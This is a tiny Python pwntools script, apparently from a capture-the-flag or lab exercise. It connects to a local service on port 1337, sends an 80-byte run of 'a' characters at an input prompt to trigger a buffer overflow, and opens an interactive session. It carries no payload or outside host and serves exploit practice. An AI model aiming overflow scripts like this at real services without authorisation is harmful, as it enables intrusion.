from pwn import *

p = remote("localhost", 1337)

p.sendlineafter(b"Input:", b"a"*0x50)
p.interactive()